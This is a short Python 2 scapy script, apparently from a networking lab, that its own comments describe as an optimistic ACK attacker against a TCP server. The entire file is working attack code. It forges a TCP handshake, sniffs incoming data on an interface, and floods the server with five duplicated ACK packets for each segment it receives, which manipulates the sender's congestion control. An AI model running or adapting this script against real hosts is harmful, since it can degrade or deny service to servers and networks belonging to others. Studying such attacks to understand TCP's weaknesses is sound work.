#!/usr/bin/env python
"""
This file implements the Optimal Ack attacker.
"""

import random
import argparse
import time
from scapy.all import *

parser = argparse.ArgumentParser(description='Attack a TCP server with the optimistic ack attack.')
parser.add_argument('--dport', default=8000, type=int, help='The port to attack.')
parser.add_argument('--sport', default=8000, type=int, help='The port to send the TCP packets from.')
parser.add_argument('--host', default='127.0.0.1', type=str, help='The ip address to attack.')
args = parser.parse_args()

DUPLICATION_FACTOR = 5

if __name__ == "__main__":
   
    print "Making connection to %s from port %d." % (args.host, args.sport)
    print "Starting three-way handshake..."
    ip_header = IP(dst=args.host) # An IP header that will take packets to the target machine.
    seq_no = 12345 # Our starting sequence number (not really used since we don't send data).

    syn = ip_header / TCP(sport=args.sport, dport=args.dport, flags='S', seq=seq_no) # Construct a SYN packet.
    synack = sr1(syn) # Send the SYN packet and recieve a SYNACK

    ack = ip_header / TCP(sport=args.sport, dport=args.dport, flags='A', ack=synack.seq + 1, seq=(seq_no + 1)) # ACK the SYNACK

    socket = conf.L2socket(iface='client-eth0')
    def handle_packet(data):
        data = data.payload.payload
        
        if data.sport != args.dport: return
        if data.dport != args.sport: return
        if not data.payload or len(data.payload) == 0: return
        final_ack = data.seq + len(data.payload) + 1
        
        for i in xrange(DUPLICATION_FACTOR):
            socket.send(Ether() / ip_header / TCP(sport=args.sport, dport=args.dport, flags='A', ack=final_ack, seq=(seq_no + 1)))
    
    socket.send(Ether() / ack)
    sniff(iface='client-eth0', filter='tcp and ip', prn=handle_packet, timeout=5) 
